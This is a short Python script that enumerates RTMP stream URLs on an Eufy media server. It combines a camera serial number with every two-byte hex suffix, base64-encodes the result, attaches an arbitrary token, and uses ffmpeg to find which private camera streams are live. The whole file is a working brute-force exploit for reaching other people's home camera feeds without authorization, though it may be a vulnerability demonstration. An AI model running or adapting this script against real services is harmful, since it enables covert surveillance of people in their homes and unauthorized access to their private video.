import base64
import time
import datetime
import subprocess 
#### Blank To Start with
payload = ""
#### Begging of RTMP String
pre = "rtmp://mediaserver-usa4.eufylife.com/hls"
#### Cameras Serial Number
sn = "T8410P412234253E"
#Arbitrary
mid = "_0_2_"

####Function to get UTC as String
def gettime():
    now = datetime.datetime.utcnow()
    t = int(time.mktime(now.timetuple()))
    #### token is just me typing randomly on my keyboard
    return "?time="+str(t)+"&token=asgertsrjyuiyy543rweg"

##### check if rtmp stream is live
def isLive(url):
    cmd = ["ffmpeg", "-i", url, "-f", "null", "-"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = p.communicate()
    output_str = output.decode("utf-8")
    error_str = error.decode("utf-8")
    if "Connection refused" in error_str:
        return False
    if "Server returned 404 Not Found" in error_str:
        return False
    if "Server returned 503 Service Unavailable" in error_str:
        return False
    if "Server returned 504 Gateway Time-out" in error_str:
        return False
    if "frame=" in output_str:
        return True
    return False

#### Go through all posibilities
for i in range (256):
    for j in range(256):
        #### Brute Force Part
        hexcode = hex(i)[2:].zfill(2)+hex(j)[2:].zfill(2)
        payload = sn+mid+hexcode
        bstring = payload.encode('utf-8')
        b64 = base64.b64encode(bstring)
        final = b64.decode('utf-8')
        url = pre+final+gettime()
        if(isLive(url)):
            print(url)
            